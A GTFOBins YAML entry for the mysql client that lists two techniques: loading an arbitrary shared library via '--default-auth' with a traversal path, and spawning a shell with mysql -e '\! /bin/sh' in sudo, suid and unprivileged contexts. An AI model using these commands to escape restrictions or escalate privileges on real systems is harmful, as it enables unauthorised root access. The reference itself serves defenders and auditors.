<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/mysql -->
---
comment: |-
  A valid MySQL server must be available to connect to.
functions:
  library-load:
  - code: |-
      mysql --default-auth ../../../../../path/to/lib
    comment: |-
      The following loads the `/path/to/lib.so` shared object.
    contexts:
      sudo:
      suid:
      unprivileged:
    version: |-
      5.5
  shell:
  - code: |-
      mysql -e '\! /bin/sh'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
